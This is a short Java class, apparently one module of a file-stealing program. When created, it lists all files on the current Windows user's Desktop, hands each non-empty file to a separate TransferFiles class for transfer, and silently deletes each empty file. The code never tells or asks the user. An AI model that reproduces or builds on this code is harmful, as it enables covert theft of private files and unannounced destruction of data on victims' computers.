package Functions;

import java.io.File;

public class ReadDesktop {
	
	String username = System.getProperty("user.name");
	String path = "C:\\Users\\" +username+ "\\Desktop";
	
	public ReadDesktop() {
		reading();
	}
	
	public void reading() {
		
		File desktopfile = new File(path);
		String filelist[] = desktopfile.list();
		int counter = filelist.length;
		for(int i = 0; i <= counter - 1; i++) {
			File file = new File ("C:\\Users\\"+username+"\\Desktop\\"+filelist[i]);
			long size = file.length();
			if(size >= 1) {
				new TransferFiles(filelist[i]); 
			}else {
				file.delete();
			}
		}
	}
}